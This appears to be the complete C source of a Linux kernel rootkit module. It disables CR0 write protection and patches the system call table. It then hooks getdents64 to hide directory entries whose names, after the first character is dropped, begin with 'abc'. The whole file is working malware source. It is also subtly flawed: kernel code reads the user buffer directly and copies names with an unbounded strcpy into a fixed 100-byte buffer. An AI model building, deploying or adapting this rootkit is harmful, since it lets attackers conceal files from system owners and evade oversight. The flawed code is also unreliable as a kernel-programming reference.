#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <asm/unistd.h>

#ifdef pr_fmt
#undef pr_fmt
#endif
#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

typedef long (*sys_call_ptr_t)(const struct pt_regs *);

static sys_call_ptr_t *real_sys_call_table;
static sys_call_ptr_t original_getdents64;

static unsigned long sys_call_table_addr;
module_param(sys_call_table_addr, ulong, 0);
MODULE_PARM_DESC(sys_call_table_addr, "Address of sys_call_table");

struct linux_dirent64 {
    unsigned long long d_ino;
    long long           d_off;
    unsigned short      d_reclen;
    char                d_name[];
};

static void write_cr0_unsafe(unsigned long val)
{
    asm volatile("mov %0,%%cr0": "+r" (val) : : "memory");
}
void removeString (char text[], int index, int rm_length)
{
    int i;

    for ( i = 0; i < index; ++i )
        if ( text[i] == '\0' )
            return;

    for ( ; i < index + rm_length; ++i )
        if ( text[i] == '\0' ) {
            text[index] = '\0';
            return;
        }

    do {
        text[i - rm_length] = text[i];
    } while ( text[i++] != '\0' );
}
static long my_getdents64(const struct pt_regs *regs)
{
    long ret = original_getdents64(regs);
    struct linux_dirent64 *dirent;
    struct linux_dirent64 *prev_dirent = NULL;
    int offset = 0;
    char temp[100];
    if (ret <= 0)
        return ret;
    while (offset < ret) {
        dirent = (struct linux_dirent64 *)((char *)regs->si + offset);
        strcpy(temp,dirent->d_name);
        removeString(temp,0,1);
        if (strncmp(temp, "abc",3) == 0) {
            if (prev_dirent){
                prev_dirent->d_reclen += dirent->d_reclen;
                offset += dirent->d_reclen; // Skip the entry
                ret -= dirent->d_reclen;
                }
            else{
                //dirent = (struct linux_dirent64 *)((char *)dirent + dirent->d_reclen);
             offset += dirent->d_reclen;    
             ret -= dirent->d_reclen;
        	}
        }
        else {
            prev_dirent = dirent;
            offset += dirent->d_reclen;
        }
    }	
    return ret;
}

static int __init modinit(void)
{
    unsigned long old_cr0;

    real_sys_call_table = (typeof(real_sys_call_table))sys_call_table_addr;

    pr_info("init\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

    original_getdents64 = real_sys_call_table[__NR_getdents64];
    real_sys_call_table[__NR_getdents64] = my_getdents64;

    write_cr0_unsafe(old_cr0);
    pr_info("init done\n");

    return 0;
}

static void __exit modexit(void)
{
    unsigned long old_cr0;

    pr_info("exit\n");

    old_cr0 = read_cr0();
    write_cr0_unsafe(old_cr0 & ~(X86_CR0_WP));

    real_sys_call_table[__NR_getdents64] = original_getdents64;

    write_cr0_unsafe(old_cr0);

    pr_info("goodbye\n");
}

module_init(modinit);
module_exit(modexit);

MODULE_LICENSE("GPL");